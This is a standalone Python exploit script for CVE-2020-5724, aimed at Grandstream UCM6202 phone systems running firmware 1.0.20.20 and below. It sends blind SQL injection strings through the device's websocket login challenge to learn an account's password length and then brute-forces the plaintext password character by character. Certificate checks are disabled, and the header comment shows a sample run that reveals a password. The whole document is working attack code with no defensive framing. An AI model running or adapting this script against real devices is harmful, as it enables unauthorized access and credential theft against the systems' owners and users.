# Version: 1.0.20.20 and below
# Grandstream UCM6202 1.0.20.20
# CVE-2020-5724

# python3 injection.py --rhost 192.168.0.222 --user admin 
# [+] Password length is 9
# [+] Discovering password...
# [+] Done! The password is LabPass1%

import sys
import ssl
import time
import json
import asyncio
import argparse
import websockets

async def password_guess(ip, port, username):

    # the path to exploit
    uri = 'wss://' + ip + ':' + str(8089) + '/websockify'

    # no ssl verification
    ssl_context = ssl.SSLContext()
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False
    
    # determine the length of the password. The timeout is 10 seconds... probably
    # way too long but whatever.
    
    length = 0
    while length < 100:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            login = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"' + username + '\' AND LENGTH(user_password)==' + str(length) + '--"}}'
            await websocket.send(login)
            response = await websocket.recv()
            inject_result = json.loads(response)
            if (inject_result['message']['status'] == 0):
                break
            else:
                length = length + 1

    # if we hit max password length than we've done something wrong
    if (length == 100):
        print('[+] Couldn\'t determine the passwords length.')
        sys.exit(1)

    print('[+] Password length is', length)
    print('[+] Discovering password...')

    # Now that we know the password length, just guess each password byte until
    # we've reached the full length. Again timeout set to 10 seconds.
    password = ''
    while len(password) < length:
        value = 0x20
        while value < 0x80:
            if value == 0x22 or value == 0x5c:
                temp_pass = password + '\\'
                temp_pass = temp_pass + chr(value)
            else:
                temp_pass = password + chr(value)
            
            temp_pass_len = len(temp_pass)

            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                
                challenge = '{"type":"request","message":{"transactionid":"123456789zxa","version":"1.0","action":"challenge","username":"' + username + "' AND user_password LIKE '" + temp_pass + "%' AND substr(user_password,1," + str(temp_pass_len) + ") = '" + temp_pass + "'--" + '"}}'
                await websocket.send(challenge)
                response = await websocket.recv()
                inject_result = json.loads(response)
                if (inject_result['message']['status'] == 0):
                    print('\r' + temp_pass, end='')
                    password = temp_pass
                    break
                else:
                    value = value + 1

        if value == 0x80:
            print('')
            print('[-] Failed to determine the password.')
            sys.exit(1)

    print('')
    print('[+] Done! The password is', password)

top_parser = argparse.ArgumentParser(description='')
top_parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The remote host to connect to")
top_parser.add_argument('--rport', action="store", dest="rport", type=int, help="The remote port to connect to", default=8089)
top_parser.add_argument('--user', action="store", dest="user", required=True, help="The user to brute force")
args = top_parser.parse_args()

asyncio.get_event_loop().run_until_complete(password_guess(args.rhost, args.rport, args.user))
